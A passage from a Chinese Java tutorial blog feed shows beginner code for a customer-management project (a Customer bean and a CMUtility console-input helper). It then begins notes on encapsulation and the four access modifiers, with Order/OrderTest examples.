类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.p2.bean;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project12</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Customer类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-28 17:08</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;        <span class="comment">// 姓名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span> gender;        <span class="comment">// 性别</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;            <span class="comment">// 年龄</span></span><br><span class="line">    <span class="keyword">private</span> String phone;       <span class="comment">// 电话</span></span><br><span class="line">    <span class="keyword">private</span> String email;       <span class="comment">// 邮箱</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Customer</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Customer</span><span class="params">(String name, <span class="type">char</span> gender, <span class="type">int</span> age, String phone, String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.phone = phone;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(<span class="type">char</span> gender)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPhone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPhone</span><span class="params">(String phone)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CMUtility-工具类"><a href="#CMUtility-工具类" class="headerlink" title="CMUtility 工具类"></a>CMUtility 工具类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.p2.util;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project12</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: CMUtility工具类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-28 17:14</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> CMUtility工具类：</span></span><br><span class="line"><span class="comment"> 将不同的功能封装为方法，就是可以直接通过调用方法使用它的功能，而无需考虑具体的功能实现细节。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMUtility</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     用于界面菜单的选择。该方法读取键盘，如果用户键入’1’-’5’中的任意字符，则方法返回。返回值为用户键入字符。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">readMenuSelection</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">            c = str.charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="string">&#x27;1&#x27;</span> &amp;&amp; c != <span class="string">&#x27;2&#x27;</span> &amp;&amp;</span><br><span class="line">                    c != <span class="string">&#x27;3&#x27;</span> &amp;&amp; c != <span class="string">&#x27;4&#x27;</span> &amp;&amp; c != <span class="string">&#x27;5&#x27;</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;选择错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     从键盘读取一个字符，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">readChar</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> str.charAt(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     从键盘读取一个字符，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     如果用户不输入字符而直接回车，方法将以defaultValue 作为返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">readChar</span><span class="params">(<span class="type">char</span> defaultValue)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">1</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (str.length() == <span class="number">0</span>) ? defaultValue : str.charAt(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     从键盘读取一个长度不超过2位的整数，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">readInt</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">2</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                n = Integer.parseInt(str);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;数字输入错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     从键盘读取一个长度不超过2位的整数，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     如果用户不输入字符而直接回车，方法将以defaultValue 作为返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">readInt</span><span class="params">(<span class="type">int</span> defaultValue)</span> &#123;</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">2</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (str.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> defaultValue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                n = Integer.parseInt(str);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;数字输入错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     从键盘读取一个长度不超过limit的字符串，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readString</span><span class="params">(<span class="type">int</span> limit)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> readKeyBoard(limit, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     从键盘读取一个长度不超过limit的字符串，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     如果用户不输入字符而直接回车，方法将以defaultValue 作为返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readString</span><span class="params">(<span class="type">int</span> limit, String defaultValue)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(limit, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> str.equals(<span class="string">&quot;&quot;</span>)? defaultValue : str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     用于确认选择的输入。该方法从键盘读取‘Y’或’N’，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">readConfirmSelection</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">1</span>, <span class="literal">false</span>).toUpperCase();</span><br><span class="line">            c = str.charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;Y&#x27;</span> || c == <span class="string">&#x27;N&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;选择错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">readKeyBoard</span><span class="params">(<span class="type">int</span> limit, <span class="type">boolean</span> blankReturn)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextLine()) &#123;</span><br><span class="line">            line = scanner.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (line.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (blankReturn) <span class="keyword">return</span> line;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (line.length() &lt; <span class="number">1</span> || line.length() &gt; limit) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;输入长度（不大于&quot;</span> + limit + <span class="string">&quot;）错误，请重新输入：&quot;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> line;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">
    &lt;div class=&quot;tag-plugin audio&quot;&gt;
    &lt;iframe src=&quot;//music.163.com/outchain/player?type=2&amp;id=1886456269&amp;auto=0&amp;height=32&quot; frameborder=&quot;no&quot;</summary>
      
    
    
    
    <category term="Java项目" scheme="https://www.bandao.ltd/categories/Java%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="基础" scheme="https://www.bandao.ltd/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="类" scheme="https://www.bandao.ltd/tags/%E7%B1%BB/"/>
    
    <category term="项目" scheme="https://www.bandao.ltd/tags/%E9%A1%B9%E7%9B%AE/"/>
    
    <category term="java bean" scheme="https://www.bandao.ltd/tags/java-bean/"/>
    
  </entry>
  
  <entry>
    <title>java学习笔记11</title>
    <link href="https://www.bandao.ltd/coding/java/note/11.html"/>
    <id>https://www.bandao.ltd/coding/java/note/11.html</id>
    <published>2021-12-19T06:16:00.000Z</published>
    <updated>2024-11-09T09:13:12.148Z</updated>
    
    <content type="html"><![CDATA[    <div class="tag-plugin audio">    <iframe src="//music.163.com/outchain/player?type=2&id=1901756112&auto=0&height=32" frameborder="no" border="0" marginwidth="0" marginheight="0" width=288px height=52>    </iframe>    </div>    <h2 id="封装性"><a href="#封装性" class="headerlink" title="封装性"></a>封装性</h2><h3 id="面向对象的特征一：封装与隐藏"><a href="#面向对象的特征一：封装与隐藏" class="headerlink" title="面向对象的特征一：封装与隐藏"></a>面向对象的特征一：封装与隐藏</h3><h4 id="一-问题的引入："><a href="#一-问题的引入：" class="headerlink" title="一.问题的引入："></a>一.问题的引入：</h4><ul><li>当创建一个类的对象后，我们可以通过”对象.属性”的方式，对对象的属性赋值。这里，赋值操作要受到属性的数据类型和存储范围的制约。</li><li>除此之外，没有其他制约条件。但是，通常我们需要给属性赋值加入额外的限制条件。</li><li>这个条件就不能在属性声明时体现，我们只能通过方法进行限制条件的添加。（比如：setLegs()）</li><li>同时，我们需要避免用户再使用”对象.属性”的方式对属性进行赋值。则需要将属性声明为私有的(private).</li><li>此时，针对于属性就体现了封装性。</li></ul><h4 id="二-封装性的体现："><a href="#二-封装性的体现：" class="headerlink" title="二.封装性的体现："></a>二.封装性的体现：</h4><ul><li>我们将类的属性 xxx 私有化(private),同时，提供公共的(public)方法来获取(getXxx)和设置(setXxx)此属性的值</li><li>拓展：封装性的体现：<ol><li>如上</li><li>不对外暴露的私有的方法</li><li>单例模式</li></ol></li></ul><h4 id="三-封装性的体现，需要权限修饰符来配合。"><a href="#三-封装性的体现，需要权限修饰符来配合。" class="headerlink" title="三.封装性的体现，需要权限修饰符来配合。"></a>三.封装性的体现，需要权限修饰符来配合。</h4><ul><li>1.Java 规定的 4 种权限（从小到大排列）：private、缺省、protected 、public</li><li>2.4 种权限可以用来修饰类及类的内部结构：属性、方法、构造器、内部类</li><li>3.具体的，4 种权限都可以用来修饰类的内部结构：属性、方法、构造器、内部类<br>修饰类的话，只能使用：缺省、public</li></ul><h4 id="四-四种访问权限修饰符"><a href="#四-四种访问权限修饰符" class="headerlink" title="四. 四种访问权限修饰符"></a>四. 四种访问权限修饰符</h4><table><thead><tr><th align="center">修饰符</th><th align="center">类内部</th><th align="center">同一个包</th><th align="center">不同包的子类</th><th align="center">同一个工程</th></tr></thead><tbody><tr><td align="center">private</td><td align="center">Yes</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">(缺省)</td><td align="center">Yes</td><td align="center">Yes</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">protected</td><td align="center">Yes</td><td align="center">Yes</td><td align="center">Yes</td><td align="center"></td></tr><tr><td align="center">public</td><td align="center">Yes</td><td align="center">Yes</td><td align="center">Yes</td><td align="center">Yes</td></tr></tbody></table><h4 id="五-java-代码"><a href="#五-java-代码" class="headerlink" title="五.java 代码"></a>五.java 代码</h4><h5 id="Order-类"><a href="#Order-类" class="headerlink" title="Order 类"></a>Order 类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Order类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-18 23:49</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Order</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> orderPrivate;</span><br><span class="line">    <span class="type">int</span> orderDefault;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> orderPublic;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">methodPrivate</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;methodPrivate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">methodDefault</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;methodDefault&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodPublic</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;methodPublic&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="同一个包下面调用类"><a href="#同一个包下面调用类" class="headerlink" title="同一个包下面调用类"></a>同一个包下面调用类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Oeder类测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-18 23:52</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Order</span> <span class="variable">order</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Order</span>();</span><br><span class="line">        order.orderDefault = <span class="number">1</span>;</span><br><span class="line">        order.orderPublic = <span class="number">2</span>;</span><br><span class="line"><span class="comment">//        a.legs = 4;//The field Animal.legs is not visible</span></span><br><span class="line"></span><br><span class="line">        order.methodDefault();</span><br><span class="line">        order.methodPublic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="不同包下面调用类"><a href="#不同包下面调用类" class="headerlink" title="不同包下面调用类"></a>不同包下面调用类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.atguigu.java.Order;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Oeder类测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 00:13</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Order</span> <span class="variable">order</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Order</span>();</span><br><span class="line">        <span class="comment">//出了Order类所属的包之后，私有的结构、缺省声明的结构就不可以调用了</span></span><br><span class="line">        <span class="comment">//order.orderDefault = 1;</span></span><br><span class="line">        order.orderPublic = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//order.methodDefault();</span></span><br><span class="line">        order.methodPublic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="六-封装性总结：Java-提供了-4-种权限修饰符来修饰类及类的内部结构，体现类及类的内部结构在被调用时的可见性的大小。"><a href="#六-封装性总结：Java-提供了-4-种权限修饰符来修饰类及类的内部结构，体现类及类的内部结构在被调用时的可见性的大小。" class="headerlink" title="六.封装性总结：Java 提供了 4 种权限修饰符来修饰类及类的内部结构，体现类及类的内部结构在被调用时的可见性的大小。"></a>六.封装性总结：Java 提供了 4 种权限修饰符来修饰类及类的内部结构，体现类及类的内部结构在被调用时的可见性的大小。</h4><h2 id="类的结构之三：构造器（或构造方法、constructor）的使用"><a href="#类的结构之三：构造器（或构造方法、constructor）的使用" class="headerlink" title="类的结构之三：构造器（或构造方法、constructor）的使用"></a>类的结构之三：构造器（或构造方法、constructor）的使用</h2><blockquote><p>construct：建设、建造。 construction:CCB constructor:建设者</p></blockquote><h3 id="一、构造器的作用："><a href="#一、构造器的作用：" class="headerlink" 